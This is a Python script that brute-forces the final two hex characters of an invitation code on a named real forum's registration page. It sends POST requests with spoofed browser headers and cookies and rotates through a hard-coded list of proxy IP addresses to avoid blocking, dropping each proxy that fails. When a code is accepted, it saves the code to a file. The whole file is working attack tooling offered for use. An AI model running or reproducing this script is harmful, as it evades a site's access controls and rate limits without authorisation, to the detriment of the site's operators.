# -*- coding:utf-8 -*-

import socket
import urllib.request
import time
import re
import gzip
import random
from http import client

socket.setdefaulttimeout(20)
t = time.time()
t -= 12000
it = int(t)
st = str(it)

url = "http://cl.ren.cl/register.php"

heade = {
		'POST':url,
		'Host':'cl.ren.cl',
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.48 Safari/537.36',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'origin':'http://184.154.128.243',
		'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2',
		'Accept-Encoding':'gzip, deflate',
		'Cookie':'227c9_lastfid=0; 227c9_lastvisit=0%091389412162%09%2Fregister.php%3F; CNZZDATA950900=cnzz_eid%3D1871223653-1389268751-http%253A%252F%252Fgroups.yahoo.com%26ntime%3D'+st+'%26cnzz_a%3D24%26sin%3Dnone%26ltime%3D'+st+'119%26rtime%3D34',
		'Connection':'keep-alive',
		'Content-Type':'application/x-www-form-urlencoded',
		'Cache-Control':'max-age=0',
		'Content-Length':'47',}

lis = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f',]
num = [9,8,7,6,5,4,3,2,1,0,]
zm = ['a','b','c','d','e','f',]

r = re.compile(r"invcode\(...\)")

dl = ['14.18.16.67', '14.18.16.68', '14.18.16.69', '14.18.16.70', '14.18.16.71', '14.18.17.166', '14.49.42.34', '14.49.42.42','27.145.135.166','54.200.14.99', '54.209.17.217','61.135.151.122', '61.143.124.155',]


precount = 0
while 1:
    try:
        count = 0
        for s2 in lis:
            for s1 in lis:
                count += 1
                if count < precount:
                    continue
                code = '593cb70390f2a9' + str(s1)+str(s2)
                m = 'reginvcode='+code+'&action=reginvcodeck'
                m = bytes(m,'utf-8')
                req = urllib.request.Request(url,data=m,headers=heade)

                p=random.choice(dl)
                proxy_support = urllib.request.ProxyHandler({"http" : "http://" + p})
                opener = urllib.request.build_opener(proxy_support)
                urllib.request.install_opener(opener)

                res = urllib.request.urlopen(req)
                html = res.read() 
                res.close()
            #  print('raw')
            #   print(html)
                html=gzip.decompress(html)
            #  print('decom')
            #lalala
            #   print(html)
                html=html.decode('gb2312',errors='ignore')
            #   print('decode')
            #print(html)
                
                foun = r.search(html)
                if foun:
                    print(p,':',count,'  ',code)
                    if foun.group() != "invcode('1')":
                        print("OK",code)
                        f = open("answer.txt","w")
                        f.write(code)
                        f.close()
                        exit()
            #time.sleep(0.5)
                precount = count
                if count >= 256:
                    print("fail")
                    exit()
    except urllib.error.HTTPError as e:
        print("*****************")
        print('wrong')
        print(e.code,e.errno)
        print(p)
        dl.remove(p)
        if dl == []:
            exit()
        print("*****************")
    except urllib.error.URLError as e:
        print("*****************")
        print("urlerror")
        print(p,e.reason)
        dl.remove(p)
        if dl == []:
                exit()
        print("*****************")
    except client.BadStatusLine as e:
        print("*****************")
        print(e)
        print(p)
        dl.remove(p)
        if dl == []:
                exit()
        print("*****************")
    except OSError as e:
        print("*****************")
        print(p)
        dl.remove(p)
        if dl == []:
                exit()
        print("*****************")
